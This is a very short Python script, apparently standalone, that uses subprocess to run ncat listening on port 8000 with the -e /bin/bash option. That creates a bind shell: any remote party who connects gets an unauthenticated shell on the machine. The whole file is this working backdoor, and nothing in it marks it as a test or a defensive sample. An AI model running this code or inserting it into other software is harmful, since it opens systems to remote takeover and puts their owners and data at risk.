import subprocess
subprocess.run(["/usr/bin/ncat", "-nlvp", "8000", "-e", "/bin/bash"])